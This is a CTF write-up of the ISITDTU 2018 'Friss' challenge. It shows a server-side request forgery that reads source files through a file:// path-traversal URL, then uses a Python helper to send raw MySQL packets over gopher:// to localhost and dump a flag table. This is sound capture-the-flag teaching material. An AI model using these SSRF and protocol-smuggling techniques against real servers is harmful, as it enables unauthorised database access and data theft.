---
title: ISITDTU CTF 2018 - Friss Writeup
layout: post
date: '2018-07-29 1:35:00'
description: Writeup of Friss
image: https://i.imgur.com/d2lTn7s.png
tags:
- ctf
- writeup
author: Guilherme "k33r0k" Assmann
---
This challenge happened this weekend and I enjoyed a lot it's solving, also got a first blood here :)

![](https://i.imgur.com/xpiQ4x4.png)

![](https://i.imgur.com/BKL98LX.png)

At first, there wasn't a lot to fiddle, we had an input and a button, basically indicating that we had a curl running. The first thing I tried was sending something to google.com and expecting for some value in response:

![](https://i.imgur.com/x44sNn7.png)

![](https://i.imgur.com/6qpAlUX.png)


Seems that we can only send stuff to localhost, so, diving deeper, we can find a small bypass for this. Put that the application isn't blocking wrappers, we can use `file://` here:

```php 
php > var_dump(parse_url('file://localhost/../var/www/html/index.php"'));
array(3) {
  ["scheme"]=>
  string(4) "file"
  ["host"]=>
  string(9) "localhost"
  ["path"]=>
  string(27) "/../var/www/html/index.php""
}
```

![](https://i.imgur.com/knlEmbs.png)

![](https://i.imgur.com/K6IYvF2.png)


Ok, got the index's source code, let's take a look:

```php 
include_once "config.php";
if (isset($_POST['url'])&&!empty($_POST['url']))
{
	$url = $_POST['url'];
	$content_url = getUrlContent($url);
}
else
{
	$content_url = "";
}
if(isset($_GET['debug']))
{
	show_source(__FILE__);
}
```

![](https://i.imgur.com/btOBq77.png)

```php 
<?php
$hosts = "localhost";
$dbusername = "ssrf_user";
$dbpasswd = "";
$dbname = "ssrf";
$dbport = 3306;

$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);

function initdb($conn)
{
	$dbinit = "create table if not exists flag(secret varchar(100));";
	if(mysqli_query($conn,$dbinit)) return 1;
	else return 0;
}

function safe($url)
{
	$tmpurl = parse_url($url, PHP_URL_HOST);
	if($tmpurl != "localhost" and $tmpurl != "127.0.0.1")
	{
		var_dump($tmpurl);
		die("<h1>Only access to localhost</h1>");
	}
	return $url;
}

function getUrlContent($url){
	$url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl ".$url;
	echo $pl;
	$content = shell_exec($pl);
	return $content;
}
initdb($conn);
?>
```

It's always interesting when we have users, passwords and such available in the code. Let's keep them as they might be useful later.

Analysing the `initdb()` function we can notice that it's creating a table named `flag` with a secret column in the database, in case it doesn't already exists.

The `safe()` function is receiving a URL a verifying, through `parse_url()`, if the host matches `localhost` or `127.0.0.1`, any other harder check here.

At the `getUrlContent()` function, I confess that I even considered a new way to bypass the `escapeshellarg()` to inject commands, but that would make no sense at all. By reading the function we can notice that it's using `escapeshellarg()` (to do what the name tells us it does) before calling `shell_exec()` and returning it to the user.

Considering the possibilites it was obvious to me that I should insist on the SSRF and maybe find out some available protocol which I could take advantage of to maybe get a shell, so I tried `ftp://`, `ssh://`, `dict://` and the `gopher://`...

![](https://i.imgur.com/tSg37dR.png)

I already have studied so many different ways to get a shell with gopher, using it along redis or fastcgi, but I have never done it with mysql. I found some articles indicating that a some part of myslq's package format, when sent through the TCP stack, would be the one that mysql would understand if we could send it through an URL. So much for abstract talk, let's see how it works in real life. Before that let's create a user, just like in the `ssrf_user` challenge, in our mysql:

```sql 
mysql> CREATE USER 'ssrf_user'@'localhost';
Query OK, 0 rows affected (0,07 sec)

mysql> GRANT USAGE ON *.* TO 'ssrf_user'@'localhost';
Query OK, 0 rows affected (0,01 sec)

mysql> GRANT ALL PRIVILEGES *.* TO 'ssrf_user'@'localhost';
Query OK, 0 rows affected (0,10 sec)
```

Now we can move forward. Let's run wireshark to see how the protocol will behave when we send mysql a connection and login request:

![](https://i.imgur.com/e2pjxmm.png)

I could get a successful login but I noticed that my Mac's mysql was generating a connection packet in a totally different way from the original. It was too big for just a login, so I started a Ubuntu with mysql along with wireshark to check this but what we're supposed to do was to select the last segment's packet shown by wireshark, the one part that makes the login attempt:

![](https://i.imgur.com/d2lTn7s.png)

We can basically split the myslq packet in two parts, the connection and the command execution. Here we have just the connection part:

![](https://i.imgur.com/zMvBS7c.png)

From now on we have to make this turn into an URL and the easiest way to do this is using the `Show and save data as` input and set it to `Raw`:

![](https://i.imgur.com/bV97KbV.png)

Ok, now we have to encode all this in the right format for the URL. It's not hard, just add `%` every two bytes and I found a script that does that for us:

```python
def result(s):
  a = [s[i:i+2] for i in xrange(0, len(s), 2)]
  return "curl gopher://127.0.0.1:3306/_%" + "%".join(a)

if __name__ == "__main__":
  import sys
  s = sys.argv[1]
print result(s)
```

![](https://i.imgur.com/Gie5b2C.png)

![](https://i.imgur.com/mJxrJjh.png)

Looks like it worked but as I mentioned before, a database table is created with the secret flag set. So we'll dump it using gopher. We'll change our login command to 

```bash
mysql -h 127.0.0.1 -u ssrf_user -e "use ssrf; select secret from flag"
```

![](https://i.imgur.com/CTDdkpI.png)

Taking a look at the new packet we can even see the query that will be executed. After redoing the whole process using this new packet, we finally got the flag:

![](https://i.imgur.com/lxvxX7Y.png)

![](https://i.imgur.com/jA991Ma.png)
